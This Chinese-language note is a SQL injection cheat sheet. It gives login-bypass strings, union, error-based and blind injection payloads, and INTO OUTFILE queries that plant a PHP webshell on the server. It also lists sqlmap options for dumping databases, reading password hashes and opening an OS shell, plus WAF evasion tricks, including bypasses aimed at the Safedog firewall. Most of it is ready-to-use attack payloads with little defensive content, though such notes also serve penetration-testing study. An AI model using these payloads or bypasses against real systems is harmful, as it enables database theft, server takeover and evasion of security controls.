## sql注入

### sql注入原理

网站在传递sql语句内容的过程中，没有对用户输入的参数进行严格过滤和限制，就直接将其内容带入到sql语句中，导致恶意的sql语句被执行，从而造成数据泄露、数据篡改等危险的结果

### sel注入条件

1. 用户能够控制输入的内容
2. 没有对用户控制的内容进行严格过滤，就直接带入到sql语句中直接执行

### SQL注入分类

#### 根据请求分类

- GET请求注入

- POST请求注入

  万能密码：

  ```sql
  ' or 123=123#
  admin' and 123=123#
  admin' and '123'='123
  ```

- COOKIE请求注入

#### 根据参数分类

- 整数型注入

  ```sql
  select uname,password from users where uid=$id
  ```

- 字符型注入

  ```sql
  select uname,password from users where uid= '$id'
  ```

- 搜索型注入

  ```sql
  select uname,password from users where uname like '%$uname%'
  ```

#### 根据注入点分类

- 联合查询注入

  > 只适合于select语句

  ```sql
  union select 1,2,3%23
  union select 1,2,(select database())
  ```

- 报错注入

  ```sql
  extractvalue(1,concat(0x7e,(select database())))%23
  updataxml(1,concat(0x7e,(select database())),3)%23
  ```

- 布尔盲注

  ```
  and length(database())>0%23
  and substr(database())='i'%23
  and ascii(substr((select database()),1,1))=105%23
  ```

- 时间盲注

  ```sql
  and if(mid((select database()),1,1)='i',sleep(5),0)%23
  and if(mid((select database()),1,1)='i',benchmark(10000000,md5('a')),0)%23 #benchmark:执行10000000次md5
  ```

- 堆叠注入

  敏感函数：mysqli_multi_query

- header头注入（User-agent、xff、client_ip、cookie）

- 宽字节注入

  宽字节注入条件

  1. 使用了addslashes()、mysql_real_eacape_string()等转义函数对单双引号进行转义（加反斜杠）
  2. 数据库为gbk编码

  利用gbk汉字编码进行绕过（%81-%fe）

  ```
  %5c%27 -> %df%5c%27 -> 運'
  ```

- urlencode注入

  两次url编码绕过（url_encode）

- base64注入

  base64编码绕过

- 二次注入（二阶注入）

  通常在有转义函数的位置（如注册用户或者留言处）中加上单引号`'`，当单引号被加上转义后插入数据库，进入数据库后被还原为只有一个单引号。当sql语句再次查询到该内容时，则会直接取出恶意数据

#### 根据数据库分类

- mysql
- mssql
- oracle
- mongodb
- access

### 手工注入流程

1. 判断url是否存在注入及注入类型（数字型，字符串）

   ```
   '
   ')
   "
   ")
   #
   and
   or
   ```

2. 判断字段数（order by x）

3. 判断回显点（union select 1,2,3）

4. 通过回显点查询数据（数据库当前表名、版本、操作系统版本、用户等等）

   ```sql
   group_concat()
   concat()
   concat_ws()
   database()
   user()       
   version()    
   @@datadir  #显示数据库数据保存路径
   @@basedir  #显示mysql安装路径
   @@version_compile_os  #显示mariadb数据编译的操作系统
   ```

5. 通过回显点查询数据

   ```sql
   union select (select database()),(select table_name from information_schema.tables where table_schema=database()),3%23
   ```

6. 通过回显点查询字段内容数据

7. 判断是否满足写webshell的条件

   1. dba权限（数据库导入导出权限）

      ```sql
      show variables like '%secure%'  #查询全局变量
      ```

      或者使用sqlmap的--is-dba参数来进行判断

   2. 知道网站的绝对路径

   3. 未对单双引号做限制

   4. mysql用户可写

   ```sql
   union select 1,2,'<?=phpinfo();?>' into outfile '/var/www/html/shell.php'%23
   union select 1,2,'<?=phpinfo();?>' into dumpfile '/var/www/html/shell.php'%23
   union select 1,2,3 into outfile '/var/www/html/shell.php' lines terminated by '<?=phpinfo()?>'%23
   union select 1,2,3 into outfile '/var/www/html/shell.php' columns terminated by '<?=phpinfo()?>'%23
   union select 1,2,3 into outfile '/var/www/html/shell.php' fields terminated by '<?=phpinfo()?>'%23
   union select 1,2,3 into outfile '/var/www/html/shell.php' lines starting by '<?=phpinfo()?>'%23
   ```

### sqlmap

参数介绍

```sql
-u  #指定url
-l  #指定日志文件
-m  #指定文件进行批量测试
-r  #从文件中读取HTTP请求（文件中为http请求包内容）
-g  #使用谷歌语法匹配测试
--cookie=  #指定cookie
--random-agent  #随机user-agent头进行测试
--threads 3 #指定线程
--dbs  #注入出网站所有数据库名
--current-db  #注入出当前数据库名
--current-user  #注入出当前用户名
--users  #查询总共有哪些用户
--passwords  #查询用户密码的哈希
--roles  #查看总有哪些角色（权限）
--privileges #查看特权
--dbmp=mysql  #指定数据库
-D|-T|-C  #指定库|表|字段名
--dump  #指定库|表|字段进行脱库
--dump-all  #对所有库进行脱库
--where='id<5'  #指定条件dump
--delay 1  #指定发包间隔（单位为s）
--time-sec  #指定时间盲注的休眠时间（单位为s）
--risk  #指定测试深度（越高会增加数据被篡改的风险。2：基于测试3：or测试，4：update测试）
--level  #指定测试等级（1-5，默认为1。2：cookie，3：user-agent，4：refere，5：host）
--purge  #清空sqlmap对该网站的缓存进行测试
--technique=B|E|U|S|T  #指定使用的注入类型(B:布尔，E:报错，U:联合，S:堆叠，T:时间)
--tamper="xxx"  #指定绕过脚本进行注入
--sql-shell  #创建一个sql的shell
--sql-file   #执行文件中的sql语句
--sql-query  #执行一个sql语句
--os-shell   #创建一个对方操作系统的shell（本质是先传一个文件上传页面，然后通过该页面传一个webshell）
--os-cmd     #执行一条系统命令
--file-read  #读取目标网站文件内容
--file-write #从本地读取一个文件内容
--file-dest  #写入到目标网站的一个文件（绝对路径）
--prefix   #指定前缀
--suffix   #指定后缀
--crawl=4  #指定爬取深度
--proxy    #指定代理
```

### waf绕过

#### waf种类

- 云waf
- 硬件waf
- 软件waf
- 代码waf

#### 常见绕过方式

1. 空格被拦截

   ```
   %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/
   ```

2. 单双引号被过滤

   - 十六进制
   - ascii char()
   - 子查询

3. 逗号被拦截

   `from 1 for 1`代替`,1,1`

   ```sql
   select substr(database(),1,1) -> select substr(database() from 1 for 1);
   ```

   limit 1 offset 0代替limit 0,1

   ```sql
   select username from users limit 0,1 -> select username from users limit 0 offset 1；
   ```

   join

   ```sql
   select * from(select user())a join (select database())b
   ```

   like爆破

   ```sql
   select username from users like 'a%'     #返回1则为匹配到
   select username from users like 'ad%'
   select username from users like 'adm%'
   select username from users like 'admi%'
   ```

   regexp爆破

   ```sql
   select username from users regexp '^a'
   select username from users regexp '^ad'
   select username from users regexp '^adm'
   ```

4. and or xor绕过

   ```sql
   and -> && -> %26%26
   or -> || -> %7c%7c
   xor -> | -> %7c
   ```

5. 比较符和等于号绕过

   利用greatest绕过<>过滤

   ```sql
   select * from users where id=1 and ascii(substr(user(),1,1))> 100
   select * from users where id=1 and greatest(ascii(substr(user(),1,1)),1)=100  #等于100则返回0
   select * from users where id in (1);  #使用in代替=号
   ```

   > sqlmap则使用between脚本，利用greatest()返回最大值，least()返回最小值

   ```sql
   and ascii('a')<>97  #表示不等于（绕过=）
   ```

6. WAF过滤关键字

   - 大小写绕过

     ```sql
     SeleCt user from users
     ```

   - 双写绕过

     ```sql
     selselectect user from users
     ```

   - 内联注释绕过

     ```sql
     /*!00000select*/ user from users
     ```

   - 特殊符号绕过

     ```sql
     /*!%23/*%0afrom*/
     database/*%!a*/()
     ```

7. 利用字典fuzz

#### 安全狗绕过

1. 内联注释

   ```sql
   /*!00000select*/ user from users
   /*!%23/*%0aselect*/ user from users
   select/*!99999*/user from users
   ```

2. 空格绕过

   ```sql
   database() -> database ()
              -> database/*!99999*/()
              -> database/**/()
   ```

3. url编码绕过

   ```sql
   and -> && -> %26%26
   or -> || -> %7c%7c
   ```

4. 注释换行绕过

   换行后不受上行单行注释的影响

   ```sql
   union -- xxx%0aselect 1,2,3%23
   ```

5. 特殊url编码绕过

   ```sql
   union/*%!a*/select 1,2,3%23
   ```

6. url另类传参绕过

   php中，当url参数出现两个同名参数时，将取最后一个参数的值（安全狗误以为/**/是注释的内容，因此全部忽略）

   ```sql
   ?tel=1&id=/*&tel=1' union select 1,2,3%23*/
   ```
